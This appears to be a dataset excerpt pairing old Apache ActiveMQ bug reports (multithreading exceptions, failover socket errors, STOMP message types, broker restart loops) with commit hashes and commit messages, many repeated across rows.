	at java.lang.Thread.run(Thread.java:595)


Thread-14 Sending total message: 10 Total time: 328 DONE !!!
[cp://localhost/127.0.0.1:61616] FailoverTransport              DEBUG Transport failed, starting up reconnect task
java.net.SocketException: socket closed
	at java.net.SocketInputStream.socketRead0(Native Method)
	at java.net.SocketInputStream.read(SocketInputStream.java:129)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
	at java.io.DataInputStream.readInt(DataInputStream.java:353)
	at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:274)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:142)
	at java.lang.Thread.run(Thread.java:595)



",763b3c337f08f23a0b4ee03d9ec58a70d6c56d2a,"AMQ-7504 - Run apache-rat:check when apache-release profile is activated

This will verify licenses when doing a release"
12482050,AMQ-750,"Modified ProducerTool.java into multi-threaded test code:

This is the peudo code:

For ( thread 1 to 30 ) 
{ 
    Connection connection = createConnection(); 
    Session session = createSession(connection); 
   Producer producer = createProducer(session); 
   sendMessages(producer, 10); //each thread send 10 messages to broker, using url = failover:tcp://localhost:61616
} 

Please turn on Debug info for log4j, otherwise you will hit other threading issue before this one, when client shutting down, this exception will be thrown:
Thread-13 Sending total message: 10 Total time: 203 DONE !!!

[                     Thread-13] FailoverTransport              DEBUG Stopped.
[cp://localhost/127.0.0.1:61616] FailoverTransport              DEBUG Transport failed, starting up reconnect task
java.net.SocketException: socket closed
	at java.net.SocketInputStream.socketRead0(Native Method)
	at java.net.SocketInputStream.read(SocketInputStream.java:129)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
	at java.io.DataInputStream.readInt(DataInputStream.java:353)
	at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:274)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:142)
	at java.lang.Thread.run(Thread.java:595)
[            ActiveMQ Scheduler] InactivityMonitor              DEBUG Message sent since last write check, resetting flag
[cp://localhost/127.0.0.1:61616] FailoverTransport              DEBUG Transport failed, starting up reconnect task
java.net.SocketException: Connection reset
	at java.net.SocketInputStream.read(SocketInputStream.java:168)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
	at java.io.DataInputStream.readInt(DataInputStream.java:353)
	at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:274)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:142)
	at java.lang.Thread.run(Thread.java:595)
[                 ActiveMQ Task] FailoverTransport              DEBUG Attempting connect to: tcp://localhost:61616


Thread-17 Sending total message: 10 Total time: 109 DONE !!!
[                     Thread-17] FailoverTransport              DEBUG Stopped.
[cp://localhost/127.0.0.1:61616] FailoverTransport              DEBUG Transport failed, starting up reconnect task
java.net.SocketException: socket closed
	at java.net.SocketInputStream.socketRead0(Native Method)
	at java.net.SocketInputStream.read(SocketInputStream.java:129)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
	at java.io.DataInputStream.readInt(DataInputStream.java:353)
	at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:274)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:142)
	at java.lang.Thread.run(Thread.java:595)


Thread-14 Sending total message: 10 Total time: 328 DONE !!!
[cp://localhost/127.0.0.1:61616] FailoverTransport              DEBUG Transport failed, starting up reconnect task
java.net.SocketException: socket closed
	at java.net.SocketInputStream.socketRead0(Native Method)
	at java.net.SocketInputStream.read(SocketInputStream.java:129)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
	at java.io.DataInputStream.readInt(DataInputStream.java:353)
	at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:274)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:142)
	at java.lang.Thread.run(Thread.java:595)



",5901d9a6f0b66f68de75944638f23f4b9676a319,AMQ-7505 - Adding missing license headers to two source files
12481738,AMQ-749,"Unable to run multithreaded MQ application, even for the simplest case.

This is the peudo code, modified the ProducerTool.java

For ( thread 1 to 30 )
{
    Connection  connection = createConnection();
    Session session = createSession(connection);
   Producer producer = createProducer(session);
   sendMessages(producer, 20);  //send 20 messages to broker using all default settings
}

these are the exceptions from broker:
Caught: javax.jms.JMSException: java.util.ConcurrentModificationException
[cp://localhost/127.0.0.1:61616] ActiveMQConnection             WARN  Async exception with no exception listener: java.util.ConcurrentModificationException
java.util.ConcurrentModificationException
	at java.util.HashMap$HashIterator.nextEntry(HashMap.java:787)
	at java.util.HashMap$EntryIterator.next(HashMap.java:829)
	at java.util.HashMap$EntryIterator.next(HashMap.java:827)
	at org.apache.activemq.broker.view.ConnectionDotFileInterceptor.printProducers(ConnectionDotFileInterceptor.java:157)
	at org.apache.activemq.broker.view.ConnectionDotFileInterceptor.generateFile(ConnectionDotFileInterceptor.java:140)
	at org.apache.activemq.broker.view.DotFileInterceptorSupport.generateFile(DotFileInterceptorSupport.java:47)
	at org.apache.activemq.broker.view.ConnectionDotFileInterceptor.addProducer(ConnectionDotFileInterceptor.java:85)
	at org.apache.activemq.broker.MutableBrokerFilter.addProducer(MutableBrokerFilter.java:90)
	at org.apache.activemq.broker.AbstractConnection.processAddProducer(AbstractConnection.java:397)
	at org.apache.activemq.command.ProducerInfo.visit(ProducerInfo.java:100)
	at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:201)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:62)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:97)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:63)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:114)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:122)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:87)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:143)
	at java.lang.Thread.run(Thread.java:595)


and exception in the client side:
javax.jms.JMSException: java.util.ConcurrentModificationException
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:45)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1137)
	at org.apache.activemq.AdvisoryConsumer.<init>(AdvisoryConsumer.java:45)
	at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1227)
	at org.apache.activemq.ActiveMQConnection.start(ActiveMQConnection.java:435)
	at com.businessobjects.framework.services.mq.ToolSupport.createConnection(ToolSupport.java:51)
	at com.businessobjects.framework.services.mq.ProducerTool.run(ProducerTool.java:106)",a7b06c043c34978125b57016a8bd82d9bb2fa6a5,AMQ-7497 - tidy up test cleanup for random order runs
12481738,AMQ-749,"Unable to run multithreaded MQ application, even for the simplest case.

This is the peudo code, modified the ProducerTool.java

For ( thread 1 to 30 )
{
    Connection  connection = createConnection();
    Session session = createSession(connection);
   Producer producer = createProducer(session);
   sendMessages(producer, 20);  //send 20 messages to broker using all default settings
}

these are the exceptions from broker:
Caught: javax.jms.JMSException: java.util.ConcurrentModificationException
[cp://localhost/127.0.0.1:61616] ActiveMQConnection             WARN  Async exception with no exception listener: java.util.ConcurrentModificationException
java.util.ConcurrentModificationException
	at java.util.HashMap$HashIterator.nextEntry(HashMap.java:787)
	at java.util.HashMap$EntryIterator.next(HashMap.java:829)
	at java.util.HashMap$EntryIterator.next(HashMap.java:827)
	at org.apache.activemq.broker.view.ConnectionDotFileInterceptor.printProducers(ConnectionDotFileInterceptor.java:157)
	at org.apache.activemq.broker.view.ConnectionDotFileInterceptor.generateFile(ConnectionDotFileInterceptor.java:140)
	at org.apache.activemq.broker.view.DotFileInterceptorSupport.generateFile(DotFileInterceptorSupport.java:47)
	at org.apache.activemq.broker.view.ConnectionDotFileInterceptor.addProducer(ConnectionDotFileInterceptor.java:85)
	at org.apache.activemq.broker.MutableBrokerFilter.addProducer(MutableBrokerFilter.java:90)
	at org.apache.activemq.broker.AbstractConnection.processAddProducer(AbstractConnection.java:397)
	at org.apache.activemq.command.ProducerInfo.visit(ProducerInfo.java:100)
	at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:201)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:62)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:97)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:63)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:114)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:122)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:87)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:143)
	at java.lang.Thread.run(Thread.java:595)


and exception in the client side:
javax.jms.JMSException: java.util.ConcurrentModificationException
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:45)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1137)
	at org.apache.activemq.AdvisoryConsumer.<init>(AdvisoryConsumer.java:45)
	at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1227)
	at org.apache.activemq.ActiveMQConnection.start(ActiveMQConnection.java:435)
	at com.businessobjects.framework.services.mq.ToolSupport.createConnection(ToolSupport.java:51)
	at com.businessobjects.framework.services.mq.ProducerTool.run(ProducerTool.java:106)",8cc5386fbbe7a836ac9aef3cffcb56c0b9f65adc,AMQ-7497 - further test to verify behaviour after ra.stop
12481738,AMQ-749,"Unable to run multithreaded MQ application, even for the simplest case.

This is the peudo code, modified the ProducerTool.java

For ( thread 1 to 30 )
{
    Connection  connection = createConnection();
    Session session = createSession(connection);
   Producer producer = createProducer(session);
   sendMessages(producer, 20);  //send 20 messages to broker using all default settings
}

these are the exceptions from broker:
Caught: javax.jms.JMSException: java.util.ConcurrentModificationException
[cp://localhost/127.0.0.1:61616] ActiveMQConnection             WARN  Async exception with no exception listener: java.util.ConcurrentModificationException
java.util.ConcurrentModificationException
	at java.util.HashMap$HashIterator.nextEntry(HashMap.java:787)
	at java.util.HashMap$EntryIterator.next(HashMap.java:829)
	at java.util.HashMap$EntryIterator.next(HashMap.java:827)
	at org.apache.activemq.broker.view.ConnectionDotFileInterceptor.printProducers(ConnectionDotFileInterceptor.java:157)
	at org.apache.activemq.broker.view.ConnectionDotFileInterceptor.generateFile(ConnectionDotFileInterceptor.java:140)
	at org.apache.activemq.broker.view.DotFileInterceptorSupport.generateFile(DotFileInterceptorSupport.java:47)
	at org.apache.activemq.broker.view.ConnectionDotFileInterceptor.addProducer(ConnectionDotFileInterceptor.java:85)
	at org.apache.activemq.broker.MutableBrokerFilter.addProducer(MutableBrokerFilter.java:90)
	at org.apache.activemq.broker.AbstractConnection.processAddProducer(AbstractConnection.java:397)
	at org.apache.activemq.command.ProducerInfo.visit(ProducerInfo.java:100)
	at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:201)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:62)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:97)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:63)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:114)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:122)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:87)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:143)
	at java.lang.Thread.run(Thread.java:595)


and exception in the client side:
javax.jms.JMSException: java.util.ConcurrentModificationException
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:45)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1137)
	at org.apache.activemq.AdvisoryConsumer.<init>(AdvisoryConsumer.java:45)
	at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1227)
	at org.apache.activemq.ActiveMQConnection.start(ActiveMQConnection.java:435)
	at com.businessobjects.framework.services.mq.ToolSupport.createConnection(ToolSupport.java:51)
	at com.businessobjects.framework.services.mq.ProducerTool.run(ProducerTool.java:106)",071edf522e0fb82779c01e97479f48bf48493f66,AMQ-7499 add pause/resume operation of a queue in web console
12481746,AMQ-740,"gregw reported the following stack trace:

java.lang.UnsupportedOperationException
        at java.util.AbstractCollection.add(AbstractCollection.java:216)
        at java.util.AbstractCollection.addAll(AbstractCollection.java:318)
        at org.apache.activemq.store.journal.JournalPersistenceAdapter.getDestinations(JournalPersistenceAdapter.java:139)        at org.apache.activemq.broker.region.AbstractRegion.getInactiveDestinations(AbstractRegion.java:193)
        at org.apache.activemq.broker.region.TopicRegion.getInactiveDestinations(TopicRegion.java:254)
        at org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:157)
        at org.apache.activemq.broker.region.TopicRegion.addConsumer(TopicRegion.java:113)
        at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:296)
        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:73)
        at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:77)
        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:73)
        at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:86)
        at org.apache.activemq.broker.AbstractConnection.processAddConsumer(AbstractConnection.java:427)
        at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:295)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:201)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:62)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:97)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:63)
        at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:76)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
        at org.apache.activemq.transport.ResponseCorrelator.asyncRequest(ResponseCorrelator.java:68)
        at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:73)
        at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1131)
        at org.apache.activemq.ActiveMQSession.syncSendPacket(ActiveMQSession.java:1667)
        at org.apache.activemq.ActiveMQMessageConsumer.<init>(ActiveMQMessageConsumer.java:196)
        at org.apache.activemq.ActiveMQSession.createConsumer(ActiveMQSession.java:840)
        at org.apache.activemq.ActiveMQSession.createConsumer(ActiveMQSession.java:800)
        at org.apache.activemq.web.WebClient.getConsumer(WebClient.java:261)
        at org.apache.activemq.web.WebClient.getConsumer(WebClient.java:255)
        at org.apache.activemq.web.MessageListenerServlet.doPost(MessageListenerServlet.java:142)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:767)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:860)
        at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:423)
        at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:966)
        at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:46)
        at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:957)
        at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:353)
        at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:226)
        at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:567)
        at org.mortbay.jetty.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:147)
        at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:126)
        at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:119)
        at org.mortbay.jetty.Server.handle(Server.java:248)
        at org.mortbay.jetty.HttpConnection.handlerRequest(HttpConnection.java:360)
        at org.mortbay.jetty.HttpConnection$RequestHandler.content(HttpConnection.java:628)
        at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:611)
        at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:197)
        at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:288)
        at org.mortbay.jetty.nio.SelectChannelConnector$HttpChannelEndPoint.run(SelectChannelConnector.java:805)
        at org.mortbay.thread.BoundedThreadPool$PoolThread.run(BoundedThreadPool.java:475)",b7dca5e0738639f2bffe7f97b9c782372fc2188e,[AMQ-7400] Fix OSGi statement about sun.rmi
12481746,AMQ-740,"gregw reported the following stack trace:

java.lang.UnsupportedOperationException
        at java.util.AbstractCollection.add(AbstractCollection.java:216)
        at java.util.AbstractCollection.addAll(AbstractCollection.java:318)
        at org.apache.activemq.store.journal.JournalPersistenceAdapter.getDestinations(JournalPersistenceAdapter.java:139)        at org.apache.activemq.broker.region.AbstractRegion.getInactiveDestinations(AbstractRegion.java:193)
        at org.apache.activemq.broker.region.TopicRegion.getInactiveDestinations(TopicRegion.java:254)
        at org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:157)
        at org.apache.activemq.broker.region.TopicRegion.addConsumer(TopicRegion.java:113)
        at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:296)
        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:73)
        at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:77)
        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:73)
        at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:86)
        at org.apache.activemq.broker.AbstractConnection.processAddConsumer(AbstractConnection.java:427)
        at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:295)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:201)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:62)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:97)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:63)
        at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:76)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
        at org.apache.activemq.transport.ResponseCorrelator.asyncRequest(ResponseCorrelator.java:68)
        at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:73)
        at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1131)
        at org.apache.activemq.ActiveMQSession.syncSendPacket(ActiveMQSession.java:1667)
        at org.apache.activemq.ActiveMQMessageConsumer.<init>(ActiveMQMessageConsumer.java:196)
        at org.apache.activemq.ActiveMQSession.createConsumer(ActiveMQSession.java:840)
        at org.apache.activemq.ActiveMQSession.createConsumer(ActiveMQSession.java:800)
        at org.apache.activemq.web.WebClient.getConsumer(WebClient.java:261)
        at org.apache.activemq.web.WebClient.getConsumer(WebClient.java:255)
        at org.apache.activemq.web.MessageListenerServlet.doPost(MessageListenerServlet.java:142)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:767)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:860)
        at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:423)
        at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:966)
        at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:46)
        at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:957)
        at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:353)
        at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:226)
        at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:567)
        at org.mortbay.jetty.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:147)
        at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:126)
        at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:119)
        at org.mortbay.jetty.Server.handle(Server.java:248)
        at org.mortbay.jetty.HttpConnection.handlerRequest(HttpConnection.java:360)
        at org.mortbay.jetty.HttpConnection$RequestHandler.content(HttpConnection.java:628)
        at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:611)
        at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:197)
        at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:288)
        at org.mortbay.jetty.nio.SelectChannelConnector$HttpChannelEndPoint.run(SelectChannelConnector.java:805)
        at org.mortbay.thread.BoundedThreadPool$PoolThread.run(BoundedThreadPool.java:475)",e6befbc8750127d3f1a0a36eec91507b57aef2ab,AMQ-7404 add debug logging for selectors loaded from the cache file
12481746,AMQ-740,"gregw reported the following stack trace:

java.lang.UnsupportedOperationException
        at java.util.AbstractCollection.add(AbstractCollection.java:216)
        at java.util.AbstractCollection.addAll(AbstractCollection.java:318)
        at org.apache.activemq.store.journal.JournalPersistenceAdapter.getDestinations(JournalPersistenceAdapter.java:139)        at org.apache.activemq.broker.region.AbstractRegion.getInactiveDestinations(AbstractRegion.java:193)
        at org.apache.activemq.broker.region.TopicRegion.getInactiveDestinations(TopicRegion.java:254)
        at org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:157)
        at org.apache.activemq.broker.region.TopicRegion.addConsumer(TopicRegion.java:113)
        at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:296)
        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:73)
        at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:77)
        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:73)
        at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:86)
        at org.apache.activemq.broker.AbstractConnection.processAddConsumer(AbstractConnection.java:427)
        at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:295)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:201)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:62)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:97)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:63)
        at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:76)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
        at org.apache.activemq.transport.ResponseCorrelator.asyncRequest(ResponseCorrelator.java:68)
        at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:73)
        at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1131)
        at org.apache.activemq.ActiveMQSession.syncSendPacket(ActiveMQSession.java:1667)
        at org.apache.activemq.ActiveMQMessageConsumer.<init>(ActiveMQMessageConsumer.java:196)
        at org.apache.activemq.ActiveMQSession.createConsumer(ActiveMQSession.java:840)
        at org.apache.activemq.ActiveMQSession.createConsumer(ActiveMQSession.java:800)
        at org.apache.activemq.web.WebClient.getConsumer(WebClient.java:261)
        at org.apache.activemq.web.WebClient.getConsumer(WebClient.java:255)
        at org.apache.activemq.web.MessageListenerServlet.doPost(MessageListenerServlet.java:142)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:767)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:860)
        at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:423)
        at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:966)
        at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:46)
        at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:957)
        at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:353)
        at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:226)
        at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:567)
        at org.mortbay.jetty.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:147)
        at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:126)
        at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:119)
        at org.mortbay.jetty.Server.handle(Server.java:248)
        at org.mortbay.jetty.HttpConnection.handlerRequest(HttpConnection.java:360)
        at org.mortbay.jetty.HttpConnection$RequestHandler.content(HttpConnection.java:628)
        at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:611)
        at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:197)
        at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:288)
        at org.mortbay.jetty.nio.SelectChannelConnector$HttpChannelEndPoint.run(SelectChannelConnector.java:805)
        at org.mortbay.thread.BoundedThreadPool$PoolThread.run(BoundedThreadPool.java:475)",ae96af6d0fb75669cfa056ddfa6502ecf44270b3,"[AMQ-7409] Exclude netty from zookeeper dependency

Credit To: Piyush Chugh <chughpiyush>"
12481674,AMQ-739,"Sending a text message from a stomp client with a content-length results in a bytes message on JMS.  Suggest doing the following ...

1) The stomp transport should always add the content-length header to out-going messages, regardless of content-type or whether or not a content-length was provided on the incoming message.
2) The stomp transport should handle in-coming messages with a content-type header, and should pass that through.
3) If a message comes in without a content-length or a content-type, it should just be assumed a TextMessage.  This way we can use the terminating null character as the delimiter.",8cdddde5b47f06d5bc9d1c27e25287bc050799c6,AMQ-7399 - Adding a unit test
12481614,AMQ-736,"When producer produces more messages than consumer can handle, after some time some messages are not delivered to the consumer (they are just skipped). To get those messages from the broker, you need to reconnect the consumer. It seems that this bug only occures if message persistance is turned on in the broker.",2db848f32dde0a900486a787c9473b5219fbb649,"added test case for AMQ-736

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@411733 13f79535-47bb-0310-9956-ffa450edef68"
12481614,AMQ-736,"When producer produces more messages than consumer can handle, after some time some messages are not delivered to the consumer (they are just skipped). To get those messages from the broker, you need to reconnect the consumer. It seems that this bug only occures if message persistance is turned on in the broker.",61bf624c6dd5a999dc9dd1f900bffc6c4feb9fa1,"[AMQ-7368] Add limitQuery in HSQL, MySQL and PostgreSQL JDBC adapters"
12481606,AMQ-732,"The simplest way to reproduce the problem:
1. Remove storage directory. 
2. Start broker using the following code:


 public static void main(String[] args)  throws Exception {
           BrokerService broker = new BrokerService();
           broker.setPersistent(true);
           DefaultPersistenceAdapterFactory pFactory = new DefaultPersistenceAdapterFactory();
           pFactory.setJournalLogFiles(1);
           pFactory.setJournalLogFileSize(2048);
           broker.setPersistenceFactory(pFactory);
           broker.setUseJmx(false);
           broker.addConnector(""tcp://localhost:61616"");
           broker.start();
           Thread.sleep(1000000000000l);
   }
3. Shutdown the broker.
4. Start broker.
It enters infinite loop

[                          main] BrokerService                  INFO  ActiveMQ null JMS Message Broker (localhost) is starting
[                          main] BrokerService                  INFO  For help or more information please see: http://incubator.apache.org/activemq/
[                          main] JDBCPersistenceAdapter         INFO  Database driver recognized: [apache_derby_embedded_jdbc_driver]
[                          main] DefaultJDBCAdapter             DEBUG Executing SQL: CREATE TABLE ACTIVEMQ_MSGS(ID INTEGER NOT NULL, CONTAINER VARCHAR(250), MSGID_PROD VARCHAR(250), MSGID_SEQ INTEGER, EXPIRATION BIGINT, MSG BLOB, PRIMARY KEY ( ID ) )
[                          main] DefaultJDBCAdapter             DEBUG Could not create JDBC tables; The message table already existed. Failure was: CREATE TABLE ACTIVEMQ_MSGS(ID INTEGER NOT NULL, CONTAINER VARCHAR(250), MSGID_PROD VARCHAR(250), MSGID_SEQ INTEGER, EXPIRATION BIGINT, MSG BLOB, PRIMARY KEY ( ID ) ) Message: Table/View 'ACTIVEMQ_MSGS' already exists in Schema 'APP'. SQLState: X0Y32 Vendor code: 20000
[                          main] DefaultJDBCAdapter             DEBUG Executing SQL: CREATE INDEX ACTIVEMQ_MSGS_MIDX ON ACTIVEMQ_MSGS (MSGID_PROD,MSGID_SEQ)
[                          main] DefaultJDBCAdapter             DEBUG Executing SQL: CREATE INDEX ACTIVEMQ_MSGS_CIDX ON ACTIVEMQ_MSGS (CONTAINER)
[                          main] DefaultJDBCAdapter             DEBUG Executing SQL: CREATE INDEX ACTIVEMQ_MSGS_EIDX ON ACTIVEMQ_MSGS (EXPIRATION)
[                          main] DefaultJDBCAdapter             DEBUG Executing SQL: CREATE TABLE ACTIVEMQ_ACKS(CONTAINER VARCHAR(250) NOT NULL, CLIENT_ID VARCHAR(250) NOT NULL, SUB_NAME VARCHAR(250) NOT NULL, SELECTOR VARCHAR(250), LAST_ACKED_ID INTEGER, PRIMARY KEY ( CONTAINER, CLIENT_ID, SUB_NAME))
